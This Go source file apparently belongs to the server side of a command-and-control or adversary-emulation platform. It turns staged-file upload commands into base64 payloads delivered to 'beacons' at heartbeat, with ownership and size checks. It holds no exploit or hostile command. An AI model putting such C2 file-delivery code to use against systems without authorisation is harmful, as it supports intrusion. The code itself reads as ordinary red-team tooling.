package dbconnections

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
)

// expandStagingUploadCommands turns queued upload maps that reference staged files (staging_id) into
// Scythe's expected {op,path,content_base64} shape. Keeps MongoDB client documents small; expansion runs at heartbeat delivery.
func expandStagingUploadCommands(ctx context.Context, clientID string, cmds []interface{}) ([]interface{}, error) {
	out := make([]interface{}, 0, len(cmds))
	for _, c := range cmds {
		m, ok := commandAsStringMap(c)
		if !ok {
			out = append(out, c)
			continue
		}
		if strings.ToLower(strings.TrimSpace(valueToString(m["op"]))) != "upload" {
			out = append(out, c)
			continue
		}
		if _, has := m["content_base64"]; has {
			out = append(out, c)
			continue
		}
		sid := strings.TrimSpace(valueToString(m["staging_id"]))
		if sid == "" {
			out = append(out, c)
			continue
		}
		path := strings.TrimSpace(valueToString(m["path"]))
		oid, err := primitive.ObjectIDFromHex(sid)
		if err != nil {
			return nil, fmt.Errorf("upload: invalid staging_id: %w", err)
		}
		meta, err := FindFileArtifact(ctx, oid)
		if err != nil || meta.Kind != FileArtifactKindStaging || meta.ClientID != clientID {
			return nil, fmt.Errorf("upload: staging artifact not found for this beacon")
		}
		raw, err := ReadArtifactBytes(oid)
		if err != nil {
			return nil, fmt.Errorf("upload: read staging file: %w", err)
		}
		if int64(len(raw)) > ScytheMaxFileBytes {
			return nil, fmt.Errorf("upload: staged file exceeds Scythe size cap")
		}
		b64 := base64.StdEncoding.EncodeToString(raw)
		out = append(out, map[string]interface{}{
			"op":             "upload",
			"path":           path,
			"content_base64": b64,
		})
	}
	return out, nil
}

func commandAsStringMap(c interface{}) (map[string]interface{}, bool) {
	switch v := c.(type) {
	case map[string]interface{}:
		return v, true
	case bson.M:
		return map[string]interface{}(v), true
	case bson.D:
		m := make(map[string]interface{}, len(v))
		for _, e := range v {
			m[e.Key] = e.Value
		}
		return m, true
	default:
		return nil, false
	}
}

func valueToString(v interface{}) string {
	if v == nil {
		return ""
	}
	switch t := v.(type) {
	case string:
		return t
	case primitive.ObjectID:
		return t.Hex()
	default:
		return fmt.Sprint(t)
	}
}
